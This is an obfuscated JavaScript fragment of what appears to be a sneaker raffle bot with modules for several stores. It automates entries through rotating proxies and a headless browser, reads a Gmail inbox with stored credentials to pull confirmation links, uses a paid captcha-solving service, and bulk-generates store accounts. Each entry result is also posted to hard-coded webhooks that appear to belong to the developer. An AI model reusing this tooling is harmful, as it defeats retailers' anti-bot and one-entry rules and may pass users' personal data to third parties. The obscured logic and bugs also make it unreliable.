                                'username': '' + _0x40f062[0x2],
                                'password': '' + _0x40f062[0x3]
                            }), await _0x415a47['setRequestInterception'](!![]), _0x415a47['on']('request', _0x4d4c49 => {
                                _0x4d4c49['resourceType']() === 'image' || _0x4d4c49['resourceType']() === 'font' || _0x4d4c49['resourceType']() === 'media' ? _0x4d4c49['abort']() : _0x4d4c49['continue']();
                            }), await _0x415a47['goto'](_0x565f89[_0x181d5e]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Task\x20' + (_0x181d5e + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x415a47['waitForSelector']('#accept-all-gdpr'), await _0x415a47['click']('#accept-all-gdpr'), await _0x415a47['waitForSelector']('#raffles-product'), await _0x90116b(0x3e8), await _0x415a47['$eval']('#raffles-product', _0x5deb59 => _0x5deb59['click']()), await _0x90116b(0x1388), await _0x415a47['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x30f889 = await _0x415a47['$']('.fancybox-inner\x20>\x20iframe'), _0x324134 = await _0x30f889['contentFrame']();
                            console['log'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Task\x20' + (_0x181d5e + 0x1) + '\x20:\x20Checking\x20Information'), await _0x324134['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x90116b(0x1f4), await _0x324134['type']('input[name=\x22sm-form-email\x22]', _0x565f89[_0x181d5e]['Email']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-form-name\x22]', _0x565f89[_0x181d5e]['FirstName'] + '\x20' + _0x565f89[_0x181d5e]['LastName']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-form-street\x22]', _0x565f89[_0x181d5e]['Address1'] + '\x20' + _0x565f89[_0x181d5e]['HouseNumber'] + '\x20' + _0x565f89[_0x181d5e]['Address2']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-form-city\x22]', _0x565f89[_0x181d5e]['City']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-form-province\x22]', _0x565f89[_0x181d5e]['State']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-form-zip\x22]', _0x565f89[_0x181d5e]['Zip']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-form-country\x22]', _0x565f89[_0x181d5e]['Country']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-form-phone\x22]', _0x565f89[_0x181d5e]['Phone']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x565f89[_0x181d5e]['Follower']), await _0x90116b(0xc8), await _0x324134['type']('input[name=\x22sm-cst.size\x22]', _0x565f89[_0x181d5e]['Size']), await _0x90116b(0x1f4), await _0x324134['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x90116b(0x1f4), await _0x324134['click']('.icheckbox_simple-custom'), await _0x90116b(0x1f4), console['log'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Task\x20' + (_0x181d5e + 0x1) + '\x20:\x20Sending\x20Request'), await _0x324134['$eval']('form', _0x171e55 => _0x171e55['submit']()), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Task\x20' + (_0x181d5e + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x4692fe = '';
                            var _0x45d120 = await _0x476a56(_0x565f89[_0x181d5e], _0x232af5, 'dev', ![]), _0xcda708 = await _0x476a56(_0x565f89[_0x181d5e], _0x232af5, 'pub', ![]);
                            const _0x464774 = {
                                'succesDEVMSG': { 'embeds': [_0x45d120] },
                                'succesPUBMSG': { 'embeds': [_0xcda708] }
                            };
                            try {
                                _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x464774['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x464774['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x3c50b7, _0x464774['succesPUBMSG']);
                            } catch (_0x4bf0fa) {
                                console['log'](_0x5bbbd3['yellow'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Task\x20' + (_0x181d5e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4bf0fa));
                            }
                        } catch (_0x5c61a7) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Task\x20' + (_0x181d5e + 0x1) + '\x20:\x20' + _0x5c61a7)), _0x4f3c5f = '' + _0x5c61a7;
                            var _0x11ab7c = await _0x476a56(_0x565f89[_0x181d5e], _0x232af5, 'dev', !![], _0x4f3c5f), _0x45d120 = await _0x476a56(_0x565f89[_0x181d5e], _0x232af5, 'dev', ![]), _0xcda708 = await _0x476a56(_0x565f89[_0x181d5e], _0x232af5, 'pub', ![]);
                            const _0x3076d0 = {
                                'succesDEVMSG': { 'embeds': [_0x45d120] },
                                'succesPUBMSG': { 'embeds': [_0xcda708] }
                            };
                            _0x3076d0['errorDEV'] = { 'embeds': [_0x11ab7c] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x3076d0['errorDEV']), await _0x2860ef(_0x406b45, _0x3076d0['errorDEV']), _0x5c61a7 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4692fe = 'yes');
                        } finally {
                            _0x1dcc16['close']();
                            if (_0x4692fe == 'yes' && _0x206256 != 0x5 && _0x4f3c5f != 'Size\x20Not\x20Found') {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Task\x20' + (_0x181d5e + 0x1) + '\x20:\x20Retrying')), _0x181d5e = _0x181d5e - 0x1, _0x206256 = _0x206256 + 0x1;
                                continue;
                            }
                            _0x4692fe == 'yes' && _0x206256 >= 0x5 && (_0x78fa55(_0x565f89[_0x181d5e], _0x232af5), _0x4692fe = 'no', _0x206256 = 0x0), console['log'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x11fc0d, _0xcc2333) {
                    var _0x245eff = [];
                    async function _0x1dafeb() {
                        var _0x3614c1 = new _0x59e93a({
                            'user': _0x474e1d['masterMail'],
                            'password': _0x474e1d['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xc32d23(_0x2de644) {
                            _0x3614c1['openBox']('INBOX', ![], _0x2de644);
                        }
                        _0x3614c1['once']('ready', function () {
                            _0xc32d23(function (_0x40cf82, _0x196cc3) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x40cf82)
                                    throw _0x40cf82;
                                _0x3614c1['seq']['search'](['UNSEEN'], function (_0x4745af, _0x3415e5) {
                                    if (!_0x3415e5 || !_0x3415e5['length'])
                                        console['log'](_0xd645bd() + '\x20[' + _0x11fc0d['name'] + ']\x20No\x20mails\x20found'), _0x3614c1['end']();
                                    else {
                                        var _0x3b67d1 = _0x3614c1['seq']['fetch'](_0x3415e5, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3b67d1['on']('message', function (_0x1c8b4c, _0x14c7c9) {
                                            var _0x301560 = '(#' + _0x14c7c9 + ')\x20';
                                            _0x1c8b4c['on']('body', function (_0xdd474d, _0x2b6982) {
                                                _0x2cd09b(_0xdd474d, (_0x3f541b, _0x2f7e9b) => {
                                                    if (_0x2f7e9b['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x3fa7bc = _0x2f7e9b['html']['split']('\x0a');
                                                        for (var _0x46f257 = 0x0; _0x46f257 < _0x3fa7bc['length']; _0x46f257++) {
                                                            if (_0x3fa7bc[_0x46f257]['includes']('salesmanago') && _0x3fa7bc[_0x46f257]['includes']('<td') && _0x3fa7bc[_0x46f257]['includes']('href')) {
                                                                var _0x1edee4 = _0x3fa7bc[_0x46f257]['split']('href=\x22'), _0x4aafa9 = _0x1edee4[0x1]['split']('\x22')[0x0];
                                                                _0x245eff['push'](_0x4aafa9);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x1c8b4c['once']('end', function () {
                                            });
                                        }), _0x3b67d1['once']('error', function (_0x3f0470) {
                                            console['log']('Fetch\x20error:\x20' + _0x3f0470);
                                        }), _0x3b67d1['once']('end', function () {
                                            _0x3614c1['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3614c1['once']('error', function (_0x946bcb) {
                            console['log'](_0x5bbbd3['red'](_0x946bcb['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x3614c1['once']('end', async function () {
                        }), _0x3614c1['connect']();
                    }
                    async function _0x4e8d17(_0x3ad113, _0x2ed78b, _0x271183) {
                        for (var _0x4ea051 = 0x0; _0x4ea051 < _0x2ed78b['length']; _0x4ea051++) {
                            async function _0x296a17(_0xc3ca9d, _0x41042b, _0x25c728, _0x286d6f, _0x1d8b47) {
                                var _0x352042, _0x3db1ee = {}, _0x25b184 = [], _0x56a270 = {}, _0x415dc6 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x34c26e = Math['round'](Math['random']() * (_0x415dc6['length'] - 0x1));
                                _0x286d6f[_0xc3ca9d]['Size'] == 'RANDOM' && (_0x286d6f[_0xc3ca9d]['Size'] = _0x415dc6[_0x34c26e]);
                                !_0x286d6f && (_0x286d6f = {});
                                if (_0x474e1d['useRandomProxy'] = ![])
                                    var _0xbc6921 = _0x1d8b47[_0xc3ca9d]['split'](':');
                                else
                                    var _0xcd875b = Math['round'](Math['random']() * (_0x1d8b47['length'] - 0x1)), _0xbc6921 = _0x1d8b47[_0xcd875b]['split'](':');
                                var _0x18f72b = {
                                    'jar': _0x6f82fb,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x25c728['url'],
                                    'headers': _0x25c728['headers'],
                                    'body': JSON['stringify'](_0x3db1ee),
                                    'proxy': 'http://' + _0xbc6921[0x2] + ':' + _0xbc6921[0x3] + '@' + _0xbc6921[0x0] + ':' + _0xbc6921[0x1]
                                };
                                return _0x41042b != 'ver' && (_0x18f72b['url'] = _0x25c728['url'], _0x18f72b['headers'] = _0x25c728['headers']), _0x41042b == 'ver' && (_0x18f72b['method'] = 'GET', _0x18f72b['url'] = _0x286d6f[_0xc3ca9d]), new Promise(function (_0x2016ae, _0x22af27) {
                                    callback = async (_0x5aa26e, _0x536608, _0x48f247) => {
                                        if (!_0x5aa26e && _0x536608['statusCode'] == 0xca || !_0x5aa26e && _0x536608['statusCode'] == 0xc8) {
                                            if (_0x41042b != 'ver') {
                                                var _0x23c705 = await _0x476a56(_0x286d6f[_0xc3ca9d], _0x25c728, 'dev', ![]), _0x54bd96 = await _0x476a56(_0x286d6f[_0xc3ca9d], _0x25c728, 'pub', ![]);
                                                const _0x2c34b6 = {
                                                    'succesDEVMSG': { 'embeds': [_0x23c705] },
                                                    'succesPUBMSG': { 'embeds': [_0x54bd96] }
                                                };
                                                if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                                                    try {
                                                        await _0x2860ef(_0x474e1d['webhook'], _0x2c34b6['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x2c34b6['succesDEVMSG']), await _0x90116b(0xc8);
                                                try {
                                                    await _0x2860ef(_0x3c50b7, _0x2c34b6['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x2812a5(_0x286d6f[_0xc3ca9d], _0x25c728);
                                            }
                                            _0x2016ae(console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x25c728['name'] + ']\x20Task\x20' + (_0xc3ca9d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x41042b != 'ver') {
                                                var _0xde2f40 = '' + _0x5aa26e, _0x2a135c = await _0x476a56(_0x286d6f[_0xc3ca9d], _0x25c728, 'dev', !![], _0xde2f40), _0x506d07 = {};
                                                _0x506d07['errorDEV'] = { 'embeds': [_0x2a135c] }, _0x78fa55(_0x286d6f[_0xc3ca9d], _0x25c728), _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x506d07['errorDEV']), await _0x2860ef(_0x406b45, _0x506d07['errorDEV']);
                                            }
                                            _0x22af27(console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x25c728['name'] + ']\x20Task\x20' + (_0xc3ca9d + 0x1) + ':\x20' + _0x5aa26e)));
                                        }
                                    };
                                    try {
                                        _0x41042b != 'ver' ? console['log'](_0xd645bd() + '\x20[' + _0x25c728['name'] + ']\x20Task\x20' + (_0xc3ca9d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3db1ee['data']['attributes']['email']) : console['log'](_0xd645bd() + '\x20[' + _0x25c728['name'] + ']\x20Task\x20' + (_0xc3ca9d + 0x1) + ':\x20Fetching\x20Response'), _0x38301a(_0x18f72b, callback);
                                    } catch (_0x404b2f) {
                                        console['log'](_0xd645bd() + '\x20Task\x20' + (_0xc3ca9d + 0x1) + ':\x20' + _0x404b2f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x296a17(_0x4ea051, 'ver', _0x3ad113, _0x2ed78b, _0x271183), console['log'](_0xd645bd() + '\x20[' + _0x3ad113['name'] + ']\x20Sleeping\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                            } catch (_0x97983a) {
                            }
                        }
                    }
                    try {
                        _0x1dafeb(), await _0x90116b(0xfa0), console['log']('Found\x20' + _0x245eff['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4e8d17(_0x11fc0d, _0x245eff, _0xcc2333);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x31b6a3, _0x53ba6e, _0x25cad7) {
                for (var _0x24e6cf = 0x0; _0x24e6cf < _0x53ba6e['length']; _0x24e6cf++) {
                    _0x474e1d['AfewDelay'] = _0x474e1d['delay'];
                    var _0x1bd7af;
                    if (_0x7cb056 != 'yes')
                        var _0x7cb056 = '', _0x2e6ac2 = 0x0;
                    var _0x228717 = _0x53ba6e[_0x24e6cf]['Url'];
                    _0x4e8779(_0x31b6a3['name'] + '\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20/\x20' + _0x53ba6e['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x53ba6e, _0x24e6cf);
                    var _0x3d6ded = await _0x476a56(_0x53ba6e[_0x24e6cf], _0x31b6a3, 'dev', ![]), _0x43b1f3 = await _0x476a56(_0x53ba6e[_0x24e6cf], _0x31b6a3, 'pub', ![]);
                    const _0x2c1330 = {
                        'succesDEVMSG': { 'embeds': [_0x3d6ded] },
                        'succesPUBMSG': { 'embeds': [_0x43b1f3] }
                    };
                    if (_0x53ba6e[_0x24e6cf]['Email'] == '' || _0x53ba6e[_0x24e6cf]['FirstName'] == '' || _0x53ba6e[_0x24e6cf]['LastName'] == '' || _0x53ba6e[_0x24e6cf]['Country'] == '' || _0x53ba6e[_0x24e6cf]['Size'] == '' || _0x53ba6e[_0x24e6cf]['Address1'] == '' || _0x53ba6e[_0x24e6cf]['Zip'] == '') {
                        console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x474e1d['useRandomProxy'] = ![])
                        var _0x1a70d1 = _0x25cad7[_0x24e6cf]['split'](':');
                    else
                        var _0x559dfc = Math['round'](Math['random']() * (_0x25cad7['length'] - 0x1)), _0x1a70d1 = _0x25cad7[_0x559dfc]['split'](':');
                    const _0x56b128 = await _0x51bd0a['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x1a70d1[0x0] + ':' + _0x1a70d1[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x5ad34e = await _0x56b128['newPage']();
                        await _0x5ad34e['setDefaultNavigationTimeout'](0x1d4c0), await _0x5ad34e['authenticate']({
                            'username': '' + _0x1a70d1[0x2],
                            'password': '' + _0x1a70d1[0x3]
                        }), console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5ad34e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5ad34e['setRequestInterception'](!![]), _0x5ad34e['on']('request', _0x27ef7d => {
                            _0x27ef7d['resourceType']() === 'image' || _0x27ef7d['resourceType']() === 'font' || _0x27ef7d['resourceType']() === 'media' ? _0x27ef7d['abort']() : _0x27ef7d['continue']();
                        }), await _0x5ad34e['goto'](_0x228717, { 'waitUntil': 'networkidle2' }), console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x5ad34e['waitForTimeout'](0xfa0), console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Cookies\x20received'), await _0x5ad34e['waitForTimeout'](0x320);
                        if (_0x53ba6e[_0x24e6cf]['Size'] == 'RANDOM') {
                            console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0xdf7dc0 = await _0x5ad34e['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0xa537c6 => {
                                return _0xa537c6['map'](_0x1f60a3 => _0x1f60a3['href']);
                            });
                            var _0x31d427 = Math['round'](Math['random']() * (_0xdf7dc0['length'] - 0x1));
                            await _0x5ad34e['goto']('' + _0xdf7dc0[_0x31d427]);
                        } else {
                            console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x53ba6e[_0x24e6cf]['Size']);
                            try {
                                const _0x8ca994 = await _0x5ad34e['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x53ba6e[_0x24e6cf]['Size'] + '\x22]\x20>\x20a', _0x781be2 => {
                                    return _0x781be2['map'](_0x4a99ee => _0x4a99ee['href']);
                                });
                                await _0x5ad34e['goto']('' + _0x8ca994[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x491fcf) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20' + _0x491fcf + '\x20Size\x20not\x20found')), _0x1bd7af = 'Size\x20Not\x20Found';
                                var _0x33392e = await _0x476a56(_0x53ba6e[_0x24e6cf], _0x31b6a3, 'dev', !![], _0x1bd7af);
                                _0x2c1330['errorDEV'] = { 'embeds': [_0x33392e] };
                                _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x2c1330['errorDEV']);
                                await _0x2860ef(_0x406b45, _0x2c1330['errorDEV']);
                                continue;
                            }
                        }
                        await _0x5ad34e['waitForTimeout'](0x258), await _0x5ad34e['type']('#raffle-instagram', '' + _0x53ba6e[_0x24e6cf]['Follower'], { 'delay': 0x64 }), await _0x5ad34e['waitForTimeout'](0x384), await _0x5ad34e['click']('#raffle-terms'), await _0x5ad34e['waitForTimeout'](0x384), await _0x5ad34e['evaluate'](() => {
                            const _0x3e0c31 = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x3e0c31['click']();
                        }), await _0x5ad34e['waitForTimeout'](0xbb8), await _0x5ad34e['waitForSelector']('#checkout_email'), await _0x90116b(0x3e8), console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5ad34e['type']('#checkout_email', '' + _0x53ba6e[_0x24e6cf]['Email'], 0x32), await _0x90116b(0x320), await _0x5ad34e['select']('#checkout_shipping_address_country', '' + _0x53ba6e[_0x24e6cf]['Country']), await _0x5ad34e['waitForTimeout'](0x258), await _0x5ad34e['type']('#checkout_shipping_address_first_name', '' + _0x53ba6e[_0x24e6cf]['FirstName']), await _0x5ad34e['waitForTimeout'](0x320), await _0x5ad34e['type']('#checkout_shipping_address_last_name', '' + _0x53ba6e[_0x24e6cf]['LastName']), await _0x5ad34e['waitForTimeout'](0x2bc), await _0x5ad34e['type']('#checkout_shipping_address_address1', _0x53ba6e[_0x24e6cf]['Address1'] + '\x20' + _0x53ba6e[_0x24e6cf]['HouseNumber']), await _0x5ad34e['waitForTimeout'](0x2bc), await _0x5ad34e['type']('#checkout_shipping_address_address2', '' + _0x53ba6e[_0x24e6cf]['Address2']), await _0x5ad34e['waitForTimeout'](0x2bc);
                        _0x53ba6e[_0x24e6cf]['Postcode'] == undefined ? await _0x5ad34e['type']('#checkout_shipping_address_zip', '' + _0x53ba6e[_0x24e6cf]['Zip']) : await _0x5ad34e['type']('#checkout_shipping_address_zip', '' + _0x53ba6e[_0x24e6cf]['Postcode']);
                        await _0x5ad34e['waitForTimeout'](0x2bc), await _0x5ad34e['type']('#checkout_shipping_address_city', '' + _0x53ba6e[_0x24e6cf]['City']), await _0x5ad34e['waitForTimeout'](0x2bc), console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x5ad34e, _0x5ad34e['evaluate'](() => {
                            const _0x2b71a1 = document['querySelector']('#continue_button');
                            for (var _0x40556e = 0x0; _0x40556e < 0x5; _0x40556e++) {
                                if (_0x2b71a1) {
                                    _0x2b71a1['click'](), _0x2b71a1['click']();
                                    break;
                                } else
                                    _0x90116b(0xfa0);
                            }
                        }), await _0x5ad34e['waitForTimeout'](0x1194);
                        try {
                            await _0x5ad34e['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x5ad34e['evaluate'](() => {
                            const _0x53bafc = document['querySelector']('#continue_button');
                            for (var _0x3b9b51 = 0x0; _0x3b9b51 < 0x5; _0x3b9b51++) {
                                if (_0x53bafc) {
                                    _0x53bafc['click']();
                                    break;
                                } else
                                    _0x90116b(0xfa0);
                            }
                        }), await _0x5ad34e['waitForTimeout'](0x7d0), console['log'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x5ad34e['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x5ad34e['evaluate'](() => {
                            const _0x10b234 = document['querySelector']('#continue_button');
                            for (var _0xd3fc36 = 0x0; _0xd3fc36 < 0x5; _0xd3fc36++) {
                                if (_0x10b234) {
                                    _0x10b234['click']();
                                    break;
                                } else
                                    _0x90116b(0xfa0);
                            }
                        }), await _0x5ad34e['waitForTimeout'](0x1194), await _0x5ad34e['waitForSelector']('#continue_button'), _0x5ad34e['evaluate'](() => {
                            const _0x494f18 = document['querySelector']('#continue_button');
                            for (var _0x3ba5bc = 0x0; _0x3ba5bc < 0x5; _0x3ba5bc++) {
                                if (_0x494f18) {
                                    _0x494f18['click']();
                                    break;
                                } else
                                    _0x90116b(0xfa0);
                            }
                        });
                        try {
                            await _0x5ad34e['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x7cb056 = 'no', _0x2812a5(_0x53ba6e[_0x24e6cf], _0x31b6a3), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                                try {
                                    await _0x2860ef(_0x474e1d['webhook'], _0x2c1330['succesDEVMSG']);
                                } catch {
                                }
                            await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x2c1330['succesDEVMSG']), await _0x90116b(0xc8);
                            try {
                                await _0x2860ef(_0x3c50b7, _0x2c1330['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x1432ed) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x1432ed));
                        }
                    } catch (_0x35a386) {
                        console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20' + _0x35a386)), _0x1bd7af = '' + _0x35a386;
                        var _0x33392e = await _0x476a56(_0x53ba6e[_0x24e6cf], _0x31b6a3, 'dev', !![], _0x1bd7af);
                        _0x2c1330['errorDEV'] = { 'embeds': [_0x33392e] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x2c1330['errorDEV']), await _0x2860ef(_0x406b45, _0x2c1330['errorDEV']), _0x7cb056 = 'yes';
                    } finally {
                        _0x56b128 && _0x56b128['close']();
                        if (_0x7cb056 == 'yes' && _0x2e6ac2 != 0x5 && _0x1bd7af != 'Size\x20Not\x20Found') {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x31b6a3['name'] + ']\x20Task\x20' + (_0x24e6cf + 0x1) + '\x20:\x20Retrying')), _0x24e6cf = _0x24e6cf - 0x1, _0x2e6ac2 = _0x2e6ac2 + 0x1;
                            continue;
                        }
                        _0x7cb056 == 'yes' && _0x2e6ac2 >= 0x5 && (_0x78fa55(_0x53ba6e[_0x24e6cf], _0x31b6a3), _0x7cb056 = 'no', _0x2e6ac2 = 0x0);
                        if (_0x24e6cf + 0x1 == _0x53ba6e['length']) {
                            await _0x90116b(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x474e1d['AfewDelay'] + '\x20ms'), await _0x90116b(_0x474e1d['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x49d0ed, _0x5443c6, _0x1cde70) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x392db9 = 0x0; _0x392db9 < _0x5443c6['length']; _0x392db9++) {
                        if (_0x35e71e != 'yes')
                            var _0x35e71e = '', _0x13fcac = 0x0;
                        var _0x35513c;
                        await _0x526adb(_0x5443c6, _0x392db9), _0x4e8779(_0x49d0ed['name'] + '\x20Task\x20' + (_0x392db9 + 0x1) + '\x20/\x20' + _0x5443c6['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc);
                        var _0x33f385 = await _0x476a56(_0x5443c6[_0x392db9], _0x49d0ed, 'acc', ![]);
                        const _0x1733fb = { 'succesDEVMSG': { 'embeds': [_0x33f385] } }, _0x38ee51 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x585299 = Math['round'](Math['random']() * (_0x1cde70['length'] - 0x1)), _0x31ae29 = _0x1cde70[_0x585299]['split'](':');
                        const _0x47e907 = await _0x51bd0a['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x31ae29[0x0] + ':' + _0x31ae29[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x27653c = await _0x47e907['newPage']();
                            await _0x27653c['authenticate']({
                                'username': '' + _0x31ae29[0x2],
                                'password': '' + _0x31ae29[0x3]
